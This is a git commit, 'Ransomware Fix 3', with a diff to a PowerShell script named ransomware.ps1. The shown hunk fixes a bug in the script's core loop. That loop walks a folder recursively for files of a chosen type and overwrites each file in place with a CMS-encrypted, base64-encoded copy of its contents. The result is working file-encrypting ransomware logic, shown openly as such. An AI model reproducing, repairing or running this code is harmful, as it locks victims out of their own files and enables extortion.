f864a2a332b29ccd6ea95c4ed261cd2a4694de42
MGSE97 <elektrikar97@gmail.com>
2020-10-25 13:21:53 +0100

    Ransomware Fix 3

--- PowerShell/ransomware.ps1
+++ PowerShell/ransomware.ps1
@@ -12,7 +12,7 @@ if((Test-Path $cert) -eq 0)
 if(Test-Path $folder -PathType Container)
 {
     # Exists
-    Get-ChildItem -Path $folder -Filter $type -Recurse -File -FullName | ForEach-Object {
+    Get-ChildItem -Path $folder -Filter $type -Recurse -File | ForEach-Object {
         # Encrypt
         [IO.File]::WriteAllText($_.FullName, (Protect-CmsMessage -To $cert -Content ([Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName)))))
     }
